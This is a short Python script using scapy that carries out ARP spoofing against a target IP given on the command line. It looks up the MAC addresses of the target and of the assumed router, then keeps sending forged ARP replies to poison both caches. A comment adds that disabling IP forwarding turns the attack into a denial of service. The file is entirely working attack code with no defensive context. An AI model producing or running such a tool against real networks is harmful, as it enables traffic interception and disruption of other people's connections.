from scapy.all import *
import sys, time

def get_mac_address(ip_address):
    try:
        broadcast_layer = scapy.all.Ether(dst='ff:ff:ff:ff:ff:ff')
        arp_layer = scapy.all.ARP(pdst=ip_address)
        get_mac_packet = broadcast_layer/arp_layer
        answer = scapy.all.srp(get_mac_packet, timeout=2, verbose=False)[0]
        return answer[0][1].hwsrc
    except IndexError:
        print("Не удалось получить MAC-адрес для {}".format(ip_address))
        sys.exit(1)

def spoof(router_ip, target_ip, router_mac, target_mac):
    packet1 = scapy.all.ARP(op=2, hwdst=router_mac, pdst=router_ip, psrc=target_ip)
    packet2 = scapy.all.ARP(op=2, hwdst=target_mac, pdst=target_ip, psrc=router_ip)
    scapy.all.send(packet1)
    scapy.all.send(packet2) #if u need to ddos atack then "echo 0 >> /proc/sys/net/ipv4/ip_forward"

target_ip = str(sys.argv[1]) #python3 arpspoof.py <target>
router_ip = str('.'.join(target_ip.split('.')[:-1] + ['1']))
target_mac = str(get_mac_address(target_ip))
router_mac = str(get_mac_address(router_ip))

try:
    while True:
        spoof(router_ip, target_ip, router_mac, target_mac)
        time.sleep(1)
except KeyboardInterrupt:
    print('exiting the programm')
    exit(0)